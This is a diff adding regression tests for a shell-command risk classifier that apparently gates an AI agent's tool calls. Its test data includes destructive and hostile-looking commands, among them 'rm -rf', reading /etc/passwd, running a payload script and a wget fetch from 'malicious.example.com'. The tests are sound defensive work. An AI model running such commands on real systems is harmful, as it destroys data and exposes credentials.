@@ -296,6 +296,60 @@ def test_browser_form_submit_is_tier2() -> None:
     assert classify_tool_risk(_tu("browser", "click submit button")) == RiskTier.WRITE
 
 
+# ── Greptile security findings — regression tests ─────────────────────────────
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "command ls",  # command builtin runs arbitrary executables
+        "command rm -rf /tmp/important",  # command + destructive
+        "command bash /tmp/payload.sh",  # command + arbitrary script
+    ],
+)
+def test_command_builtin_arbitrary_exec_is_not_tier1(cmd: str) -> None:
+    """'command <executable>' is not safe — only 'command -v' (existence check) is."""
+    result = classify_tool_risk(_tu("shell", cmd))
+    assert result >= RiskTier.WRITE, (
+        f"Expected ≥WRITE for command-builtin bypass: {cmd!r}"
+    )
+
+
+def test_command_v_is_tier1() -> None:
+    """'command -v <name>' is a pure existence check — safe READ."""
+    assert classify_tool_risk(_tu("shell", "command -v python3")) == RiskTier.READ
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "python3 -c 'print(open(\"/etc/passwd\").read())'",  # reads file via print arg
+        'python3 -c \'print(open("/tmp/evil", "w").write("x"))\'',  # writes via arg
+        "python -c 'print(os.system(\"rm -rf /tmp\"))'",  # os.system via print arg
+    ],
+)
+def test_python_c_print_bypass_is_not_tier1(cmd: str) -> None:
+    """'python -c print(...)' can have side-effecting args — not safe to auto-approve."""
+    result = classify_tool_risk(_tu("shell", cmd))
+    assert result >= RiskTier.WRITE, (
+        f"Expected ≥WRITE for python -c print bypass: {cmd!r}"
+    )
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "wget -q https://example.com/file.tar.gz",  # downloads and saves to disk
+        "wget -q https://malicious.example.com/payload.sh",  # saves payload
+        "wget -q https://example.com/data.json",  # writes file
+    ],
+)
+def test_wget_q_file_download_is_not_tier1(cmd: str) -> None:
+    """wget -q still writes downloaded content to disk — not a READ-only operation."""
+    result = classify_tool_risk(_tu("shell", cmd))
+    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for wget file download: {cmd!r}"
+
+
 # ── RiskTier ordering ──────────────────────────────────────────────────────────
 
 
